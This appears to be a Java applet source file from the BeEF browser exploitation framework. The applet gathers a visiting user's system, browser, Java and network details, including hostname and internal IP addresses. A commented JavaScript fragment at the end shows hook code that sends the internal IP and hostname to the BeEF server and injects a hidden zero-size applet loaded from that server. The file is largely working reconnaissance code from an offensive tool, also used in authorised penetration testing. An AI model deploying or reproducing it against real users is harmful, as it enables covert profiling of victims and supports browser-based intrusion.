/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

import java.applet.*;
import java.awt.*;
import java.net.*;
import java.util.*;

public class getSystemInfo extends Applet {

	public getSystemInfo() {
		super();
		return;
	}

	public static String getInfo() {

		String result = "";

		// -- Processor -- //
		try {
			// System.out.println("Available processors (cores): "+Integer.toString(Runtime.getRuntime().availableProcessors()));
			result += "Available processors (cores): "+Integer.toString(Runtime.getRuntime().availableProcessors())+"\n";
		}
		catch (Exception exception) {
			//result += "Exception while gathering processor info: "+exception;
			result += "Exception while gathering processor info\n";
		}

		// -- Memory -- //
		try {
			long maximumMemory = Runtime.getRuntime().maxMemory();
			// System.out.println("Maximum memory (bytes): " + (maximumMemory == Long.MAX_VALUE ? "No maximum" : maximumMemory));
			result += "Maximum memory (bytes): " + (maximumMemory == Long.MAX_VALUE ? "No maximum" : maximumMemory)+"\n";
			// System.out.println("Free memory (bytes): " + Runtime.getRuntime().freeMemory());
			result += "Free memory (bytes): " + Runtime.getRuntime().freeMemory()+"\n";
			// System.out.println("Total memory (bytes): " + Runtime.getRuntime().totalMemory());
			result += "Total memory (bytes): " + Runtime.getRuntime().totalMemory()+"\n";
		}
		catch (Exception exception) {
			//result += "Exception while gathering memory info: "+exception;
			result += "Exception while gathering memory info\n";
		}

		// -- Displays -- //
		try {
			GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
			// System.out.println("Default Screen: "+ge.getDefaultScreenDevice().getIDstring());
			result += "Default Screen: "+ge.getDefaultScreenDevice().getIDstring()+"\n";
			GraphicsDevice[] gs = ge.getScreenDevices();
			for (int i=0; i<gs.length; i++) {
				DisplayMode dm = gs[i].getDisplayMode();
				// System.out.println(gs[i].getIDstring()+" Mode: "+Integer.toString(dm.getWidth())+"x"+Integer.toString(dm.getHeight())+" "+Integer.toString(dm.getBitDepth())+"bit @ "+Integer.toString(dm.getRefreshRate())+"Hertz");
				result += gs[i].getIDstring()+" Mode: "+Integer.toString(dm.getWidth())+"x"+Integer.toString(dm.getHeight())+" "+Integer.toString(dm.getBitDepth())+"bit @ "+Integer.toString(dm.getRefreshRate())+"Hertz"+"\n";
			}
		}
		catch (Exception exception) {
			//result += "Exception while gathering display info: "+exception;
			result += "Exception while gathering display info\n";
		}

		// -- OS -- //
		try {
			// System.out.println("OS Name: "+System.getProperty("os.name"));
			result += "OS Name: "+System.getProperty("os.name")+"\n";
			// System.out.println("OS Version: "+System.getProperty("os.version"));
			result += "OS Version: "+System.getProperty("os.version")+"\n";
			// System.out.println("OS Architecture: "+System.getProperty("os.arch"));
			result += "OS Architecture: "+System.getProperty("os.arch")+"\n";
		}
		catch (Exception exception) {
			//result += "Exception while gathering OS info: "+exception;
			result += "Exception while gathering OS info\n";
		}

		// -- Browser -- //
		try {
			// System.out.println("Browser Name: "+System.getProperty("browser"));
			result += "Browser Name: "+System.getProperty("browser")+"\n";
			// System.out.println("Browser Version: "+System.getProperty("browser.version"));
			result += "Browser Version: "+System.getProperty("browser.version")+"\n";
		}
		catch (Exception exception) {
			//result += "Exception while gathering browser info: "+exception;
			result += "Exception while gathering browser info\n";
		}

		// -- Java -- //
		try {
			// System.out.println("Java Vendor: "+System.getProperty("java.vendor"));
			result += "Java Vendor: "+System.getProperty("java.vendor")+"\n";
			// System.out.println("Java Version: "+System.getProperty("java.version"));
			result += "Java Version: "+System.getProperty("java.version")+"\n";
			// System.out.println("Java Specification Version: "+System.getProperty("java.specification.version"));
			result += "Java Specification Version: "+System.getProperty("java.specification.version")+"\n";
			// System.out.println("Java VM Version: "+System.getProperty("java.vm.version"));
			result += "Java VM Version: "+System.getProperty("java.vm.version")+"\n";
		}
		catch (Exception exception) {
			//result += "Exception while gathering java info: "+exception;
			result += "Exception while gathering java info\n";
		}

		// -- Network -- //
		try {
			// System.out.println("Host Name: " + InetAddress.getLocalHost().getHostName());
			result += "Host Name: " + java.net.InetAddress.getLocalHost().getHostName()+"\n";
			// System.out.println("Host Address: " + InetAddress.getLocalHost().getHostAddress());
			result += "Host Address: " + java.net.InetAddress.getLocalHost().getHostAddress()+"\n";
			// System.out.println("Network Interfaces:");
			result += "Network Interfaces (interface, name, IP):\n";
			Enumeration networkInterfaces = NetworkInterface.getNetworkInterfaces();
			while (networkInterfaces.hasMoreElements()) {
				NetworkInterface networkInterface = (NetworkInterface) networkInterfaces.nextElement();
				result += networkInterface.getName() + ", ";
                result += networkInterface.getDisplayName()+ ", ";
                Enumeration inetAddresses = (networkInterface.getInetAddresses());
                if(inetAddresses.hasMoreElements()){
                   while (inetAddresses.hasMoreElements()) {
                    InetAddress inetAddress = (InetAddress)inetAddresses.nextElement();
                    result +=inetAddress.getHostAddress() + "\n";
                   }
                }else{
                   result += "\n"; // in case we can't retrieve the address of some network interfaces
                }
			}
		}
		catch (Exception exception) {
			//result += "Exception while gathering network info: "+exception;
			result += "Exception while gathering network info\n";
		}

		return result;

  }

}



/*
        if (beef.browser.isFF()) {
                var internal_ip = beef.net.local.getLocalAddress();
                var internal_hostname = beef.net.local.getLocalHostname();

                if(internal_ip && internal_hostname) {
                        beef.net.send('<%= @command_url %>', <%= @command_id %>,
                                'internal_ip='+internal_ip+'&internal_hostname='+internal_hostname);
                }
        } else {
                //Trying to insert the Beeffeine applet
                content = "<APPLET code='Beeffeine' codebase='http://"+beef.net.host+":"+beef.net.port+"/Beeffeine.class' width=0 height=0 id=beeffeine name=beeffeine></APPLET>";
                $j('body').append(content);
                internal_counter = 0;
                //We have to kick off a loop now, because the user has to accept the running of the applet perhaps

*/
